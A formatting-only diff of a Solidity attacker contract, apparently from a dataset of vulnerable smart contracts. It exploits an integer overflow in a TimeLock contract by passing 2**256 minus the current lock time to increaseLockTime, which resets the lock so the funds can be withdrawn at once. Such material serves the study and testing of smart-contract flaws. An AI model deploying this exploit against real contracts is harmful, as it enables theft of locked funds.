@@ -1,11 +1,11 @@
- pragma solidity ^0.4.10;
+pragma solidity ^0.4.10;
 
- import "../dataset/arithmetic/timelock.sol";
- 
- contract TimeLockAttacker {
+import "../dataset/arithmetic/timelock.sol";
+
+contract TimeLockAttacker {
     TimeLock public target;
 
-    constructor (address _targetAddress) public {
+    constructor(address _targetAddress) public {
         target = TimeLock(_targetAddress);
     }
 
@@ -14,11 +14,9 @@
     }
 
     function attack() public {
-
         uint256 timeLock = target.lockTime(address(this));
-        uint256 overflowValue = 2**256 - 1 - timeLock + 1;
+        uint256 overflowValue = 2 ** 256 - 1 - timeLock + 1;
         target.increaseLockTime(overflowValue);
-
     }
 
     function withdraw() public {
@@ -26,4 +24,4 @@
     }
 
     function() public payable {}
- }
+}
